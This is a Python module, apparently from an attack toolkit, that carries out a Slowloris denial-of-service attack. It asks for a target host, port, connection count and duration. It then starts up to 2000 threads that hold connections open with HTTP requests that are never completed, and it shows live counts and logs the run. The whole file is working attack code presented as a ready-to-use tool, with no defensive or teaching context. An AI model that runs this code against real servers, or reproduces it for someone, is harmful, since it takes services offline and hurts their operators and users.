import socket
import threading
import time
from modules.utils import pcolor, resolve
from modules.logger import save_log

def slowloris_attack(ip, port, stop, stats):
    sockets = []
    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((ip, port))
            
            # Send partial HTTP request (never completes)
            request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n"
            s.send(request.encode())
            sockets.append(s)
            stats['p'] += 1
            
            # Keep connections open
            if len(sockets) > 500:
                sockets.pop(0).close()
                
        except:
            stats['e'] += 1

def slowloris():
    pcolor("b", "\n[ SLOWLORIS ATTACK ]\n")
    pcolor("y", "[!] Slowloris keeps connections open - exhausts server threads\n")
    
    target = input("Target IP: ")
    if not target.replace('.', '').isdigit():
        ip = resolve(target)
        if not ip:
            input("Press Enter...")
            return
    else:
        ip = target
    
    port = int(input("Port (80): ") or 80)
    threads = int(input("Connections (2000): ") or 2000)
    duration = int(input("Duration (60 sec): ") or 60)
    
    print(f"\nTarget: {ip}:{port}")
    print(f"Connections: {threads}")
    print(f"Duration: {duration}s")
    
    confirm = input("\nStart attack? (y/n): ")
    if confirm != 'y':
        return
    
    stop = threading.Event()
    stats = {'p': 0, 'e': 0}
    
    for _ in range(threads):
        threading.Thread(target=slowloris_attack, args=(ip, port, stop, stats), daemon=True).start()
    
    pcolor("g", f"\n[!] SLOWLORIS ATTACK STARTED on {ip}:{port}")
    pcolor("y", "[!] Keeping connections open...")
    start = time.time()
    
    try:
        while time.time() - start < duration:
            remaining = int(duration - (time.time() - start))
            print(f"\r[LIVE] Open connections: {stats['p']} | Failed: {stats['e']} | Time: {remaining}s    ", end="")
            time.sleep(1)
    except KeyboardInterrupt:
        pcolor("y", "\n[!] Stopping...")
    finally:
        stop.set()
        pcolor("g", f"\n\n[+] ATTACK FINISHED")
        print(f"Connections opened: {stats['p']}")
        save_log(ip, port, "SLOWLORIS", threads, duration, stats['p'], stats['e'])
    
    input("\nPress Enter...")
